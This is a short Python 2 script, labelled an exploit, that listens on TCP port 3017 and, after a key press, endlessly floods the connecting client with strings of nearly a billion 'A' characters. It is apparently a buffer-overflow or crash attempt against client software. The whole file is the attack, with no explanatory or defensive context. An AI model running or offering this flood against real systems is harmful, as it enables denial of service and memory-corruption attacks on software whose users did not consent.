import socket
from socket import *
import sys

start = "Exploit Started."
junk = "A"*999999999
port = 3017
s = socket(AF_INET, SOCK_STREAM)

def Bind():
	global c
	s.bind(("", port))
	s.listen(5)
	c, a = s.accept()
def StartExploit():
	c.send(start)
	print(c.recv(65535))
	count = 0
	raw_input("Hit enter to start overflow")
	while 1:
		c.send(junk)
		count += 999999999
		sys.stdout.write('\r{} Amount of junk sent.'.format(count))
		sys.stdout.flush()
Bind()
StartExploit()
